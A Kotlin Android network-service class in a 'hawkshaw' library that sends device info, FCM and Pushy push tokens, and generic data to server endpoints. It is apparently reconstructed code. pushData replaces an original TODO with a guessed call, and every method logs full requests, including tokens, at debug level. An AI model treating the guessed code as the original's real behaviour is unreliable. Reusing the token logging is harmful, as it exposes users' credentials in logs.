package com.hawkshaw.library.datalayer.network.service

import com.hawkshaw.library.datalayer.models.PushDataRequest
import com.hawkshaw.library.datalayer.models.PushDeviceInfoRequest
import com.hawkshaw.library.datalayer.models.PushDeviceInfoResponse
import com.hawkshaw.library.datalayer.models.PushFCMTokenRequest
import com.hawkshaw.library.datalayer.models.PushFCMTokenResponse
import com.hawkshaw.library.datalayer.models.PushPushyTokenRequest
import com.hawkshaw.library.datalayer.models.PushPushyTokenResponse
// It seems Empty is not used here but often used with apiCall, keeping it in mind
// import com.hawkshaw.library.datalayer.models.Empty
import com.hawkshaw.library.datalayer.network.twirp.ApiResponse
import com.hawkshaw.library.datalayer.network.twirp.apiCall
import android.util.Log // Added for logging

/**
 * Implementation of the AppService interface
 */
class AppServiceImpl : AppService {
    private companion object { // Companion object for TAG
        private const val TAG = "AppServiceImplLogs"
    }

    init {
        Log.d(TAG, "[DEBUG] AppServiceImpl instance created.")
    }

    /**
     * Push device information to the server
     */
    override suspend fun pushDeviceInfo(request: PushDeviceInfoRequest): ApiResponse<PushDeviceInfoResponse> {
        Log.d(TAG, "[DEBUG] pushDeviceInfo called. Request: $request")
        val endpoint = "app.App/PushDeviceInfo"
        Log.d(TAG, "[DEBUG] pushDeviceInfo: Calling apiCall with endpoint: \"$endpoint\", request: $request, retry: default (true)")
        // Explicitly specify type arguments for S and T
        val response = apiCall<PushDeviceInfoRequest, PushDeviceInfoResponse>(
            endpoint = endpoint,
            req = request
        )
        Log.d(TAG, "[DEBUG] pushDeviceInfo: apiCall returned. Response: $response")
        return response
    }

    /**
     * Push FCM token to the server
     */
    override suspend fun pushFCMToken(request: PushFCMTokenRequest): ApiResponse<PushFCMTokenResponse> {
        Log.d(TAG, "[DEBUG] pushFCMToken called. Request: $request")
        val endpoint = "app.App/SaveFCMToken"
        Log.d(TAG, "[DEBUG] pushFCMToken: Calling apiCall with endpoint: \"$endpoint\", request: $request, retry: default (true)")
        // Explicitly specify type arguments for S and T
        val response = apiCall<PushFCMTokenRequest, PushFCMTokenResponse>(
            endpoint = endpoint,
            req = request
        )
        Log.d(TAG, "[DEBUG] pushFCMToken: apiCall returned. Response: $response")
        return response
    }

    /**
     * Push Pushy token to the server
     * Note: This method uses retry functionality
     */
    override suspend fun pushPushyToken(request: PushPushyTokenRequest): ApiResponse<PushPushyTokenResponse> {
        Log.d(TAG, "[DEBUG] pushPushyToken called. Request: $request")
        val endpoint = "app.App/SavePushyToken"
        Log.d(TAG, "[DEBUG] pushPushyToken: Calling apiCall with endpoint: \"$endpoint\", request: $request, retry: true")
        // Explicitly specify type arguments for S and T
        val response = apiCall<PushPushyTokenRequest, PushPushyTokenResponse>(
            endpoint = endpoint,
            req = request,
            retry = true // Explicitly passing retry as it's mentioned in the original code
        )
        Log.d(TAG, "[DEBUG] pushPushyToken: apiCall returned. Response: $response")
        return response
    }

    override suspend fun pushData(request: PushDataRequest): ApiResponse<Unit> {
        Log.d(TAG, "[DEBUG] pushData called. Request: $request")
        // The original code has TODO("Not yet implemented")
        // If it were to make an apiCall, it would look like:
        val endpoint = "app.App/PushData"
        Log.d(TAG, "[DEBUG] pushData: Calling apiCall with endpoint: \"$endpoint\", request: $request, retry: default (true)")
        val response = apiCall<PushDataRequest, Unit>( // Assuming Unit for response if no specific data is returned
        endpoint = endpoint,
        req = request
        )
        Log.d(TAG, "[DEBUG] pushData: apiCall returned. Response: $response")
        return response
        //Log.w(TAG, "[DEBUG] pushData: Executing TODO(\"Not yet implemented\")")
        //TODO("Not yet implemented")
    }
}
